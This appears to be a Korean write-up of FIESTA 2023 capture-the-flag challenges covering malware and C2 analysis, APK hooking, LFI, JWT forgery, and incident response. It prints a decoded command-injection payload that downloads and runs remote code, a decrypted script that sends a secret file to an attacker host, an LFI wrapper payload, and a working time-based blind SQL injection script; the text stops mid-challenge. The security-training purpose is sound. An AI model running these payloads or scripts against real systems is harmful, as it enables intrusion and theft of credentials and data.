# fiesta2023 write up

## 공급망 공격

---

### ○ 공급망 공격 1

die로 분석하면 VB 6 버전의 프로그램이다.

프로그램을 실행하면 MSCOMCTL.OCX와 관련된 오류가 발생한다.

[MSCOMCTL.OCX 가 없어서 프로그램 실행이 안됩니다](https://omnislog.com/1330#google_vignette)

링크의 방법으로 해결하면 실행과 분석이 가능하다.

```c
C:\Windows\system32>regsvr32 MSCOMCTL.OCX
```

관리자 권한으로 명령어 실행하면 레지스트리가 등록되고 문제를 해결할 수 있다.

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled.png)

프로그램이 정상적으로 실행된다.

VB 6 버전 프로그램 분석과 관련된 툴을 찾아보면 `VB Decompiler`라는 툴이 나온다.

툴을 이용해서 코드를 분석하자.

```c
InternetConnectA(var_8C, "40.82.159.132", 1337, Proc_4_3_40513C(var_8C, var_F0), Proc_4_4_404FDC(0))
```

module2에서 위와 같이 FTP 서버로 연결하는 것을 확인할 수 있다.

IP는 "40.82.159.132", PORT는 1337이다.

4, 5번째 인자가 ID, PW이므로 각각의 함수를 분석해보자.

```c
Public Sub Proc_4_3_40513C
  'Data Table: 401748
  Dim var_90 As Integer
  loc_4050CF: var_8C = "rtbu"
  loc_4050DC: For var_94 = 1 To CInt(Len(var_8C)): var_8E = var_94 'Integer
  loc_4050FB:   var_90 = Asc(Mid$(var_8C, CLng(var_8E), 1))
  loc_405126:   arg_0 = Mid$(Chr$(CLng(var_90 Xor 7 Xor 7)), 1, CLng(var_8E))
  loc_40512F: Next var_94 'Integer
  loc_405137: var_88 = var_8C
  loc_40513A: Exit Sub
End Sub
```

ID 함수부터 분석해보자.

`rtbu`를 7로 XOR 연산한다. 

필자는 이 부분에서 디컴파일 억까를 당했는데, xor을 2번 하는 것이 이상해서 최신버전의 `VB Decompiler`을 다운받고 opcode를 확인해봤더니 xor을 1번만 진행하는 코드였다.

```c
Public Sub Proc_4_3_40513C
  'Data Table: 401748
  Dim var_90 As Integer
  loc_4050CF: var_8C = "rtbu"
  loc_4050DC: For var_94 = 1 To CInt(Len(var_8C)): var_8E = var_94 'Integer
  loc_4050FB:   var_90 = Asc(Mid$(var_8C, CLng(var_8E), 1))
  loc_405126:   arg_0 = Mid$(Chr$(CLng(var_90 Xor 7)), 1, CLng(var_8E))
  loc_40512F: Next var_94 'Integer
  loc_405137: var_88 = var_8C
  loc_40513A: Exit Sub
End Sub
```

즉, 코드를 수정하면 위와 같다.

정리하자면, `rtbu`의 각 자리를 7로 xor한 결과를 구하면 된다.

PW도 같은 원리로 작동하는 함수였고 ID, PW를 구하는 코드는 다음과 같다.

```python
id = "rtbu"
password = "dofidb65$#"

for i in list(id):
  print(chr(ord(i)^7), end='')
print()

for i in list(password):
  print(chr(ord(i)^7), end='')
print()
```

```c
ID: user
PW: chance12#$
```

코드를 실행하면, 위와 같이 ID, PW를 구할 수 있다.

```c
fiesta{40.82.159.132_1337_user_chance12#$}
```

### ○ 공급망 공격 2

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%201.png)

패킷을 분석하면 43.202.63.59가 C2 서버인 것을 알 수 있고 `VdbNDQYi.php`를 통해 파일을 다운 받는다.

```jsx
?file=php://filter/convert.base64-encode/resource=/var/www/html/VdbNDQYi.php
```

C2 서버의 `VdbNDQYi.php`는 LFI 취약점이 존재한다. 따라서 `php wrapper`를 이용해서 C2 서버의 코드를 읽을 수 있다. 

필자는 `QyODUwZD.php`, `mZTcxMjU.php` 등 확인이 필요한 코드를 모두 Leak 했다.

첨부는 못했지만 코드를 분석하면 `QyODUwZD.php`를 이용해서 seed1, seed2를 생성하고 `mZTcxMjU.php`로 데이터를 복호화한다.

따라서 seed1, seed2, decrypt 로직을 분석하고 다음과 같이 각 값을 구하는 코드를 작성하여 flag를 획득하면 된다.

다음은 flag와 관련된 패킷이다.

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%202.png)

seed1, seed2, decrypt 로직을 분석하고 작성한 코드는 다음과 같다.

### ○ seed1.py

```python
# seed1.py
class NetDataObf:
    P2PEG_INT32_MASK = -1 << 32 ^ -1

    def __init__(self, s0, s1):
        self.state0 = s0
        self.state1 = s1

    @staticmethod
    def add64(x, y):
        x32 = x & NetDataObf.P2PEG_INT32_MASK
        y32 = y & NetDataObf.P2PEG_INT32_MASK
        xy = x32 + y32
        return (((x >> 32) + (y >> 32) + (xy >> 32)) << 32) | (xy & NetDataObf.P2PEG_INT32_MASK)

    def rand(self):
        x = self.state0
        y = self.state1

        self.state0 = y

        x ^= x << 23
        x ^= y ^ ((x >> 17) & (-1 << 47 ^ -1)) ^ ((y >> 26) & (-1 << 38 ^ -1))
        self.state1 = x

        return self.add64(x, y)

    def process_buf(self, arr):
        arr_length = len(arr)
        result = bytearray(arr_length)
        for i in range(arr_length):
            rand_byte = self.rand() & 0xFF
            result[i] = arr[i] ^ rand_byte
        return bytes(result)

def decrypt_data(data):
    ndo = NetDataObf(0x00, 0xff)
    result = ndo.process_buf(data)
    return result

def bytes_from_hex(hex_string):
    hex_string = hex_string.replace(" ", "").lower()
    byte_array = bytes.fromhex(hex_string)
    return byte_array

data_hex = "0c10ed0e859d91e2c564228af7277e6ab882e93a0baa49fa9452ffad7b642083677b6dd3807cea12a78d2ac65c14683bb92f35ff38a5e02cfaefccc8f81bf150ef0ab1bedf7fc5ce"
data_bytes = bytes.fromhex(data_hex)
request_body = decrypt_data(data_bytes[4:])

print(request_body)
```

### ○ seed2.py

```python
# seed2.py
class NetDataObf:
    P2PEG_INT32_MASK = -1 << 32 ^ -1

    def __init__(self, s0, s1):
        self.state0 = s0
        self.state1 = s1

    @staticmethod
    def add64(x, y):
        x32 = x & NetDataObf.P2PEG_INT32_MASK
        y32 = y & NetDataObf.P2PEG_INT32_MASK
        xy = x32 + y32
        return (((x >> 32) + (y >> 32) + (xy >> 32)) << 32) | (xy & NetDataObf.P2PEG_INT32_MASK)

    def rand(self):
        x = self.state0
        y = self.state1

        self.state0 = y

        x ^= x << 23
        x ^= y ^ ((x >> 17) & (-1 << 47 ^ -1)) ^ ((y >> 26) & (-1 << 38 ^ -1))
        self.state1 = x

        return self.add64(x, y)

    def process_buf(self, arr):
        arr_length = len(arr)
        result = bytearray(arr_length)
        for i in range(arr_length):
            rand_byte = self.rand() & 0xFF
            result[i] = arr[i] ^ rand_byte
        return bytes(result)

def decrypt_data(data, seed):
    ndo = NetDataObf(seed, 0xff)
    result = ndo.process_buf(data)
    return result

def bytes_from_hex(hex_string):
    hex_string = hex_string.replace(" ", "").lower()
    byte_array = bytes.fromhex(hex_string)
    return byte_array

seed1 = 3230992749343881762

data_hex = "8805544667a42deebe5989b6b5215f7ad001a4d51d847252ca05bde825"
data_bytes = bytes.fromhex(data_hex[8:])
seed2 = decrypt_data(data_bytes, seed1)
print(seed2)
```

### ○ decrypt.py

```python
# decrypt.py
class NetDataObf:
    P2PEG_INT32_MASK = -1 << 32 ^ -1

    def __init__(self, s0, s1):
        self.state0 = s0
        self.state1 = s1

    @staticmethod
    def add64(x, y):
        x32 = x & NetDataObf.P2PEG_INT32_MASK
        y32 = y & NetDataObf.P2PEG_INT32_MASK
        xy = x32 + y32
        return (((x >> 32) + (y >> 32) + (xy >> 32)) << 32) | (xy & NetDataObf.P2PEG_INT32_MASK)

    def rand(self):
        x = self.state0
        y = self.state1

        self.state0 = y

        x ^= x << 23
        x ^= y ^ ((x >> 17) & (-1 << 47 ^ -1)) ^ ((y >> 26) & (-1 << 38 ^ -1))
        self.state1 = x

        return self.add64(x, y)

    def process_buf(self, arr):
        arr_length = len(arr)
        result = bytearray(arr_length)
        for i in range(arr_length):
            rand_byte = self.rand() & 0xFF
            result[i] = arr[i] ^ rand_byte
        return bytes(result)

def decrypt_data(data, seed1, seed2):
    ndo = NetDataObf(seed1, seed2)
    result = ndo.process_buf(data)
    return result

def bytes_from_hex(hex_string):
    hex_string = hex_string.replace(" ", "").lower()
    byte_array = bytes.fromhex(hex_string)
    return byte_array

seed1 = 3230992749343881762
seed2 = 9122131998151730639

data_hex = "b723426fafae5af48f7ad75561b6c00d0b55c90602f3e68c61b71eefbdaeabfd0761f5ad8c29fe90ff79f1499b18b3c61c00d42a3324bb904c8fad6dbaa06066aee0694c6ed998954192fe44ce223c9287f95ce63dffc66c041fd8b01f86e337529ebda862baa6a3fe5eb28c44106ad72e69"
data_bytes = bytes.fromhex(data_hex)
data = decrypt_data(data_bytes[4:], seed1, seed2)
print(data)
```

```jsx
b'{"1":4,"2":"Zmllc3Rhe2I2ZTllNGY4N2JlZmJlZTQxMzA5ZGQxYjc4NzNkZjZjMzhkZDA2ZTA0YjAwNTgzZTVhZGNhNzc4Y2MzYTRmOTZ9"}
```

코드 실행 결과를 base64 디코딩하면 flag를 획득할 수 있다.

```jsx
fiesta{b6e9e4f87befbee41309dd1b7873df6c38dd06e04b00583e5adca778cc3a4f96}
```

## 악성 앱

---

### ○ 악성 앱 1

```python
└─# gobuster dir -u http://3.35.235.215/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://3.35.235.215/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/09/10 06:34:11 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 307) [Size: 0] [--> http://3.35.235.215/assets/]
/docs                 (Status: 200) [Size: 931]
/download             (Status: 422) [Size: 137]
Progress: 4367 / 4615 (94.63%)
===============================================================
2023/09/10 06:34:18 Finished
```

gobuster를 이용해서 path를 확인하면 `/docs` 경로가 있다.

`/docs`는 fastAPI 프레임워크 경로로 개발자가 작성한 코드를 자동으로 분석해서 API 문서를 생성하고 표시하는 기능을 제공한다.

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%203.png)

접속하면, 서비스 API를 파악할 수 있다.

이 중에서 `/download`의 f 파라미터를 활용하면 LFI를 수행할 수 있다.

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%204.png)

테스트로 위와 같이 `/etc/passwd` 파일이 Leak 된다.

목적은 `/admin`에 접근하는 것이다. `/admin`에 정상적으로 접근하기 위해서는 app.py 를 확인해야한다. (접속해보면 알겠지만, 정체 모를 검증이 존재한다.)

```python
/proc/self/cmdline
```

cmdline에 접근해서 웹 서버 작업 디렉토리 경로를 파악했다.

```python
/web/app.py

/web/config.py
```

파악한 경로를 토대로 `/download`를 이용해서 2가지 파일을 Leak 할 수 있다.

```python
@app.get("/admin")
async def admin(request: Request):
    if not "authorization" in request.headers:
        raise HTTPException(status_code=404)
    try:
        decoded_token = jwt.decode(request.headers['authorization'], SECRET_KEY, algorithms=[ALGORITHM])
        if decoded_token['id'] == 'admin':
            return templates.TemplateResponse("admin.html", {"request": request})
        else:
            raise HTTPException(status_code=404)
    except:
        raise HTTPException(status_code=404)
```

`/admin`을 보자.

authorication이라는 헤더를 이용해서 검증하고 있으며, jwt 디코딩을 수행하고 id가 admin인지 확인하는 루틴이다.

그렇다면 할 수 있는 것은 id가 admin인 jwt 토큰을 생성하는 것이다.

```python
SECRET_KEY = "09d25e094faa6ca2556c818166b7a9563b93f7099f6f0f4caa6cf63b88e8d3e7"
ACCESS_TOKEN_EXPIRE_MINUTES = 1440
ALGORITHM = "HS256"
```

jwt 토큰을 생성하기위해 필요한 알고리즘과 SECRET_KET는 config.py에 정의되어있다.

```python
import jwt

SECRET_KEY = "09d25e094faa6ca2556c818166b7a9563b93f7099f6f0f4caa6cf63b88e8d3e7"
ALGORITHM = "HS256"

payload = {
    "id": "admin",
}

token = jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

print(token)
```

정보들을 토대로 admin의 jwt 토큰을 생성하자.

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%205.png)

마지막으로 authorication 헤더를 admin jwt 토큰으로 추가하고 `/admin`으로 요청하면 flag를 획득할 수 있다.

### ○ 악성 앱 2

Q) 악성 앱을 분석하여 어떤 정보들이 넘어가는지와 C2 서버에 전달을 허용하는 복호화된 키 값 그리고 전달하고 있는 복호화된 파라미터를 획득하라.

flag : 복호화된 키 값

APK를 분석하기위해 JEB로 디컴파일하자. 

C2 서버에 전달하는 key를 얻는 것이므로 http 통신과 관련된 문자열을 검색했다.

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%206.png)

검색 결과로 `13.124.114.239:9999`라는 문자열이 검색된다.

```python
String v7_1 = c4.p.e1(v13_3, "", null, null, null, 62);
String v8_1 = a0.B(v8);
String v6_1 = a0.B(v6);
String v9_7 = a0.B(v9_6);
String v5_1 = a0.B(v5);
String v10_6 = a0.B(v11_3);
String v11_4 = a0.B(v12_1);
String v3_4 = a0.B(v3_3);
String v7_2 = a0.B(v7_1);
j v12_2 = f.b;
h.d(v12_2, "engineFactory");
b v13_4 = new b();
s2.b v12_3 = v12_2.a(((l)v13_4.d.a(v13_4, b.i[0])));
v14 = new a(v12_3, v13_4);
z0 v13_5 = (z0)v14.l.get(t4.z0.b.i);
h.b(v13_5);
v13_5.O(new g(v12_3));
String v3_5 = c4.p.e1(b4.i.q0(new b4.d[]{new b4.d(v8_1, "INSERT"), new b4.d(v6_1, v1.p.getValue()), new b4.d(v9_7, v1.q.getValue()), new b4.d(v5_1, v1.r.getValue()), new b4.d(v10_6, v1.s.getValue()), new b4.d(v11_4, v1.t.getValue()), new b4.d(v3_4, v1.u.getValue()), new b4.d("key", v7_2)}), "&", null, null, n.b.j, 30);
y2.c v5_2 = y2.c.a;
w2.d v6_2 = new w2.d();
z v7_3 = v6_2.a;
z2.a0 v8_2 = z2.a0.a.a("http");
v7_3.getClass();
v7_3.a = v8_2;
v7_3.b = "localhost";
v7_3.c = 0;
v7_3.f = "/";
h.d(v6_2.a, "$this$null");
r v7_4 = r.c;
h.d(v7_4, "<set-?>");
v6_2.b = v7_4;
h.d(v5_2, "<set-?>");
v6_2.d = v5_2;
z v5_3 = v6_2.a;
h.d(v5_3, "<this>");
try {
    a5.f.X(v5_3, "http://13.124.114.239:9999/");
}
catch(Throwable v0_6) {
    throw new p2.k("http://13.124.114.239:9999/", v0_6);
}
```

해당 문자열을 trace하면 위와 같은 코드가 나온다.

http 요청과 관련된 파라미터를 생성하고 C2 서버로 데이터를 보내는 코드다.

여기서부터는 동적분석으로 key를 찾아야겠다고 판단했고 frida를 이용한 후킹 작업을 실시했다.

```python
String v3_5 = c4.p.e1(b4.i.q0(new b4.d[]{new b4.d(v8_1, "INSERT"), new b4.d(v6_1, v1.p.getValue()), new b4.d(v9_7, v1.q.getValue()), new b4.d(v5_1, v1.r.getValue()), new b4.d(v10_6, v1.s.getValue()), new b4.d(v11_4, v1.t.getValue()), new b4.d(v3_4, v1.u.getValue()), new b4.d("key", v7_2)}), "&", null, null, n.b.j, 30);
```

먼저, `c4.p.e1()`을 후킹했고 v3_5에 저장되는 결과는 다음과 같다.

```python
|x$ishtu=INSERT&hqp$dsi=tttt&ks$weilu=01012345678&wwsd$rfifq=990101&pf$uxgdq=1234-1234-1234-1234&gf$zugds=10&ffy$gudf=123&key=<444454<63$4444<3<3;
```

딱 봐도 http 요청으로 전달되는 `key=value` 형태의 데이터다.

자세히보면 QR 코드 생성 전에 입력한 정보들이 저장됐다. 그러나 몇 가지 key와 value를 보면 암호화된 것을 알 수 있다.

```python
key=<444454<63$4444<3<3;
```

가장 중요한 key도 암호화됐다.

그렇다면, 이 함수를 실행하기 전에 key를 암호화 했을 것이다.

암호화하는 코드는 다음과 같다.

```python
String v7_1 = c4.p.e1(v13_3, "", null, null, null, 62);
String v8_1 = a0.B(v8);
String v6_1 = a0.B(v6);
String v9_7 = a0.B(v9_6);
String v5_1 = a0.B(v5);
String v10_6 = a0.B(v11_3);
String v11_4 = a0.B(v12_1);
String v3_4 = a0.B(v3_3);
String v7_2 = a0.B(v7_1);
```

`a0.B()`가 암호화 함수다.

### ○ solve

```python
import frida, sys

def on_message(message, data):
	if message['type'] == 'send':
		print("[*] {0}".format(message['payload']))
	else:
		print(message)

PACKAGE_NAME = "com.ctf.fastpayments"

jscode = """
    console.log("[*] Start Hooking");

    Java.perform(function() {
      var a0 = Java.use("androidx.compose.ui.platform.a0");
      a0.B.implementation = function(arg1){
          console.log(arg1);
          return this.B(arg1);
      }
    });
"""
    
try:
    device = frida.get_usb_device(timeout=10)
    pid = device.spawn([PACKAGE_NAME]) 
    print("App is starting ... pid : {}".format(pid))
    #pid=4564
    process = device.attach(pid)
    device.resume(pid)
    script = process.create_script(jscode)
    script.on('message',on_message)
    print('[*] Running Frida')
    script.load()
    sys.stdin.read()
except Exception as e:
    print(e)
    
```

위와 같이 `a0.B()`의 인자를 후킹하는 코드를 작성했다.

인자가 평문이고 결과가 암호문일 것이므로 인자를 후킹했다.

결과는 다음과 같이 나온다.

```python
App is starting ... pid : 6581
[*] Running Frida
[*] Start Hooking
fpquery
fpname
fpbirth
fpcontact
cardnum
cardpwd
cardcvc
1131109899110112109
```

마지막 숫자가 key다.

```python
fiesta{1131109899110112109}
```

## 랜섬웨어

---

### ○ 랜섬웨어 1

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%207.png)

VMware 이미지에서 Downloads 폴더를 보면 몇 가지 exe 파일이 존재한다.

```c
PS C:\Users\kangsuky\Downloads> Get-FileHash -Algorithm SHA256 .\portry.exe

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          AD1553CAA9F56CB7A43927F9D494EACB7DF3CDC6D1A01EE3FE3C8BA696E536EF       C:\Users\kangsuky\Downloads\p...
```

`GET-FileHash` 명령어를 이용하면 exe 파일의 해시를 알 수 있다.

확인해보면, `portry.exe`가 랜섬웨어 프로그램이다.

## APT

---

### ○ APT 1

Q) 공격자는 피해자에게 메일을 전송하는 방법으로 악성 코드를 전달했습니다. 하지만 악성 코드는 피해자의 컴퓨터를 완전히 파괴했고, 따라서 메일 서버에서 추출한 메일 원본 파일에서 악성 코드를 찾아 추출해 악성파일의 sha256를 알려주세요.

문제로 EML 파일들이 주어진다.

[EML analyzer](https://eml-analyzer.herokuapp.com/)

- EML 분석 사이트

[Free MSG EML Viewer | Free Online Email Viewer](https://www.encryptomatic.com/viewer/)

- EML 추출 사이트

링크의 사이트를 이용해서 모든 EML 파일을 분석하면, 총 4개의 exe 프로그램을 획득할 수 있다.

```c
PS C:\Users\user\Desktop\they> Get-FileHash -Algorithm SHA256 .\becauseq1af2332.exe

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          BCB10A8E6250ECB142932BA59CBE94E47F2E143564DF1886A5838317BC275B40       C:\Users\user\Desktop\they\be...
```

필자는 4개의 exe를 모두 flag 브포 때렸다. 

그 중에서 email0007.eml에서 추출한 `becauseq1af2332.exe`가 악성 프로그램이다.

```c
fiesta{bcb10a8e6250ecb142932ba59cbe94e47f2e143564df1886a5838317bc275b40}
```

## 침해대응 3

---

보안 장비에 내부 PC를 대상으로 한 공격 시도가 감지되었다.

네트워크 패킷 분석을 통해 여러 건의 공격 시도 중 어떤 것이 성공했는지 판별하고 공격자가 획득한 기밀 정보를 식별하라.

FLAG 형식 : `fiesta{ + CVE-????-???? + 기밀정보`

예시 : 기밀정보가 _fiesta}, 공격에 성공한 취약점이 CVE-1111-1111이면 플래그는 fiesta{CVE-1111-1111_fiesta}입니다.

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%208.png)

http 패킷을 보다보면 cgi 페이지를 이용해서 comand injection을 수행한 흔적이 있다.

![Untitled](fiesta2023%20write%20up%207a0be444de464e16aded646bf739fd24/Untitled%209.png)

응답 패킷을 트레이스해보면 MiniServ라는 서버를 사용하는 cgi 서비스인 것을 알 수 있다.

[https://github.com/jas502n/CVE-2019-15107](https://github.com/jas502n/CVE-2019-15107)

MiniServ 웹 서버와 관련된 CVE를 검색하면 위 CVE가 등장한다.

요약하자면, `password_change.cgi`를 통해서 command injection을 수행하고 RCE 하는 방식이다.

```python
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=ZDJkbGRDQXhPVEl1TVRZNExqRTFNaTR4TXpBNk9EQTRNQzhnTFU4Z0wzUnRjQzloYXpGdU1qTTBJQ1ltSUhkblpYUWdhSFIwY0hNNkx5OWxiMkZwTWpVMmREUTRiR1ZzY3pNdWJTNXdhWEJsWkhKbFlXMHVibVYwSUMxUElDOTBiWEF2YmpFeU15NXdlU0FtSmlCd2VYUm9iMjRnTDNSdGNDOXVNVEl6TG5CNUppWWdjbTBnTDNSdGNDOHE
```

```python
wget 192.168.152.130:8080/ -O /tmp/ak1n234 && wget https://eoai256t48lels3.m.pipedream.net -O /tmp/n123.py && python /tmp/n123.py&& rm /tmp/*
```

공격자가 command injection을 수행한 payload를 base64 디코딩해보면 위와 같이 등장한다.

### ○ n123.py

```python
f=open('./ak1n234','r')
c=''
for i in f.read():
  c+=chr(ord(i)^0x10)
f.close()
d = open('./a1n234_','w')
d.write(c)
d.close()
import os
os.system("python /tmp/a1n234_")
```

pipedream으로부터 `n123.py`를 다운로드 받으면 위와 같은 코드가 나온다. 

`ak1n234`파일에서 payload를 읽고 복호화한 후에 python으로 실행시키는 방식이다.

공격자가 command injection을 수행한 패킷을 보면 `ak1n234`는 8080 포트를 이용해서 가져온다. 따라서 wireshark로 8080 패킷을 필터 걸고 확인해보면 아래와 같은 데이터를 전송하는 것을 알 수 있다.

```python
~<u0-08" $($($()') '')(&"$'"&"!& $ $"'$ % $$!$%!)!!(("% ")""'$(!#!)%&' "&###&"($)"'#'!("$)# &)"'("$%# $%)"%& ( $''$&("&((''&&&)&$!!")&$#$#  '%"$!'("#%"# '%&%% !#)%'%&%"%"#%)&)$)$(%''& )%!#"'!'$&"(&$# & $'#( %'$!# #"  "! $"!('%'!$)!$'(!%(&$'!!%$&#"("$#"%"# #!&$''#"'(&%##!'"'#'(' "# "!$%!%#%"# ("%)&('& %!'$ %"!$!#%(% ("$#! !)'(#$ #"#(%$#("&'$"!%$!&"#&( "(%%'( )$(!%)")(%#$&%#'$"' )&) $#&&"'$! $ )(()$$!" #'()!$& )) $%$ '"#)'&""!(# & "##$  $%#')"$'%  (%"%(( #%%%$ !!")  #&%&' %#(')$%"))()'"$%%(# )$"((&'#!#)"# "''!#$ ""'%%#!'!!' "%$'#)"%!')!!')#% #(%)#("(&#$) $'"!# #"' !"!$''%)( '%(%"'")%""&!%'"!"$$ &)''#)%"(%#&$'! $(%&&!%#<0#9y}`bd0ry~qcsyydbi*0000v0-0`u~82?cusbud>dhd2<7br790000tqdq0-0y~d8ry~qcsyy>xuh|yvi8v>buqt899<!&90000u~stqdq0-00cdb8xuh8`g8tqdq<0u<0~999>u~stu890000y}`bd0cs{ud0000cs{0-0cs{ud>cs{ud8cs{ud>QVOY^UD<0cs{ud>C_S[OTWBQ]90000cs{>cu~td8u~stqdq<087!)">!&(>!%">!# 7<0%!$"!990000cs{>s|cu89uhsu`d*0000`qcc
```

위 데이터가 `ak1n234` 라는 것을 추측 할 수 있다.

`n123.py`에서 데이터를 xor 연산해서 복호화하는 것을 볼 수 있었다. 

우리도 복호화해보자.

### ○ ak1n234

```python
n,e = (20484848979077986247262160404274050441451911882502922748131956702633362849273718249306927824530459256080477468268877666964112964343007524178235230756550139575652523596949485776095132717462864306047380574130320021042187571491478158647115463282432523031647732786533172737870230214515352308259687605174052141358508243101978340323854382674215416236802855780948159298534653742709690436627410409889441203789146099045407239762218306023340045379247500852588035554011290036567053879452998972455830942886731392302771340227553171170254739251791179350385938286349047213032701214775980758527295226157212440697739528536471048566153, 3)

import binascii    
f = open("./secret.txt",'rb')    
data = int(binascii.hexlify(f.read()),16)    
encdata =  str(hex(pow(data, e, n))).encode()    
print(encdata)

import socket    
try:
  sck = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)    
  sck.send(encdata, ('192.168.152.130', 51421))    
  sck.clse()
except:    
  pass
```

복호화한 코드다.

`secret.txt`를 읽고 RSA 암호화해서 C2 서버로 전송한다.

복호화를 위해서는 d를 구해야하는데, n이 너무 큰 관계로 factorial인 p, q를 구할 수 없어서 굉장히 난해했다.

하지만 e가 3인 것을 보고 취약점이 발생할 수 있겠다고 생각했고 `rsa Low Exponential Attack`이라는 공격기법을 이용했다.

### ○ solve

```python
from gmpy2 import *

# https://foxtrotin.tistory.com/291
encdata_hex = "0xd3e5a3da7412766fcef80819e5215db5bf6a742f9d7dfb4d7b841c6322b0c0b3f99e7cc79d98b8a8bfd085afa8935ec7d5af716a16b5b50b9f5f9e8a5d36bf3688f325d660b3fc418f46bede1cc48b0166869787a5262ed693427beea32158ea7f89ddfadd76c7fe8"

encdata_int = int(encdata_hex, 16)

c = encdata_int

with local_context() as ctx:
    ctx.precision = 3000
    m = cbrt(c)
    #m = iroot(c, 3)[0]
    
    print('%x' % int(m)).decode("hex")
```

`rsa Low Exponential Attack` 은 e를 너무 작은 값으로 사용하고 n을 큰 값으로 사용한 경우에 d를 구할 필요없이 encdata에서 plaintext를 추출할 수 있는 취약점이다.

`rsa Low Exponential Attack`을 이용하여 plaintext를 추출하는 코드를 작성하고 실행했다.

```python
_ce343a02efb635cdf61948a9dd101259}
```

실행결과인 hex를 string으로 변환하면 공격자가 탈취한 데이터를 획득할 수 있다.

```python
fiesta{CVE-2019-15107_ce343a02efb635cdf61948a9dd101259}
```

## 침해대응 6

---

<aside>
📝 A 기업의 보안 관제팀에서 웹 서비스에서 발생된 공격을 탐지했다. 관제팀에서 요청하는 사항은 세 가지로 아래와 같다.

- 침해된 웹 서비스의 로그를 분석하여 공격을 통해 침해된 정보를 식별하고, 시간상 가장 우선 탈취된 데이터를 파악하라.
- 탈취된 사용자 계정에 접근해 정보를 획득하라.
- 웹 서비스에서 추가적인 공격 포인트를 파악하라.
- 플래그는 /flag 경로에 존재합니다.
- 플래그는 3개이고, 최종 플래그는 순서대로 아래와 같은 형태를 갖습니다. 
`fiesta{[a-z0-9-]_[a-z0-9]{40}_[a-z0-9]{40}}`
</aside>

수많은 웹 로그들이 존재해서 핵심만 찾아서 분석해야한다.

쭉 훓어보면 SQL injection을 수행한 흔적이 있어서 

```python
grep "sleep" access.log > sqli.log
```

위와 같이 “sleep” 키워드를 이용해서 sqli.log를 추출했다.

```python
/mypage.php?uid=807cd54d-62cc-4b33-ba87-6d6624eb0a4d&username='%20or%20permission=1%20and%20if((ASCII((SUBSTR((uid),2,1)))=97),sleep(5),(select%201))%20limit%201%23
```

로그를 보면 위와 같이 `time based blind sql injection`을 수행한 흔적이 보인다.

```python
grep 'sleep' access.log > uid.log
```

위 명령어로 blind sql injection 로그만 추출해서 분석을 해보자.

```python
uid = [52, 102, 48, 54, 101, 57, 53, 55, 45, 102, 53, 99, 101, 45, 52, 98, 100, 52, 45, 98, 53, 98, 49, 45, 100, 49, 56, 101, 49, 56, 51, 97, 49, 97, 49, 99]

print('uid: ',end='')
for i in uid:
  print(chr(i), end='')
print()

username = [115, 107, 115, 109, 115, 114, 104, 107, 115, 102]

print('username: ',end='')
for i in username:
  print(chr(i), end='')
print()

from requests import *
from time import *

url = "http://3.35.136.196"

leng = 0
for i in range(100):
  param = f"/mypage.php?uid=807cd54d-62cc-4b33-ba87-6d6624eb0a4d&username='%20or%20permission=1%20and%20if((LENGTH(password)={i}),sleep(5),(select%201))%23"
  start = time()
  res = get(url=url+param)
  end = time()
  if end - start > 5:
    print(i)
    leng = i
    break

password = ''
for i in range(1, leng+1):
  #print('test')
  for j in range(33, 123):
    param = f"/mypage.php?uid=63c1832d-76dd-485a-a7dd-b7e69f3cf0c6&username='%20or%20permission=1%20and%20if((ASCII((SUBSTR((password),{i},1)))={j}),sleep(5),(select%201))%23"
    start = time()
    res = get(url=url+param)
    end = time()
    if end - start > 5:
      print(chr(j))
      password += chr(j)
      break
print()
print('password: '+password)

leng = 0
for i in range(100):
  param = f"/mypage.php?uid=807cd54d-62cc-4b33-ba87-6d6624eb0a4d&username='%20or%20permission=1%20and%20if((LENGTH(email)={i}),sleep(5),(select%201))%23"
  start = time()
  res = get(url=url+param)
  end = time()
  if end - start > 5:
    print(i)
    leng = i
    break

email = ''
for i in range(1, leng+1):
  #print('test')
  for j in range(33, 123):
    param = f"/mypage.php?uid=63c1832d-76dd-485a-a7dd-b7e69f3cf0c6&username='%20or%20permission=1%20and%20if((ASCII((SUBSTR((email),{i},1)))={j}),sleep(5),(select%201))%23"
    start = time()
    res = get(url=url+param)
    end = time()
    if end - start > 5:
      print(chr(j))
      email += chr(j)
      break
print()
print('email: '+email)

'''
uid: 4f06e957-f5ce-4bd4-b5b1-d18e183a1a1c
username: sksmsrhksf
password: $2y$14$rOsQwVUnJHENA.MnDBB1O.ah9ZTBIIKBcVWh.XHKIlckrVe7XRUPa
email: sksmsrhksflwk_rhksflfmfgkwl@festa.air
'''
```

로그를 분석한 것을 토대로 uid와 username을 알아내는 코드다.

1번째 flag인 uid 획득할 수 있다.

```python
uid: 4f06e957-f5ce-4bd4-b5b1-d18e183a1a1c
username: sksmsrhksf
```

```python
/mypage.php?uid=4f06e957-f5ce-4bd4-b5b1-d18e183a1a1c&username=sksmsrhksf
```

다음으로 탈취된 사용자 계정에 접근해 정보를 획득하는 것이 목적이므로 위 링크로 접속을 시도했지만 접속이 안된다.

```python
cat access.log | awk '$9 == 200 {print $7}' | sort | uniq > success.log
```

위와 같이 success인 경우의 path만 추출해서 확인해봤다.

